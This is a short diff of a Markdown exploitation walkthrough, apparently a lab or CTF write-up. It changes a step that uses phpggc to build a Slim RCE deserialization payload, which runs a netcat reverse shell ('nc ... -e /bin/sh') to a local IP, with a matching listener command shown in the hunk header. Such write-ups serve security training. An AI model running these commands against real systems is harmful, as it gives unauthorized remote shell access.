@@ -49,7 +49,7 @@ nc -nlvp 6666
 
 **Step 9:** Capture the system IP Address and use that to generate the payload of reverse shell using the following command and capture the payload.<br />
 ```
-./phpggc -b slim/rce1 "nc 192.168.29.88 6666 -e /bin/sh"
+./phpggc -b slim/rce1 system "nc 192.168.29.88 6666 -e /bin/sh"
 ```
 <kbd> <img src="9.png" /> </kbd>
 <br /> <br />
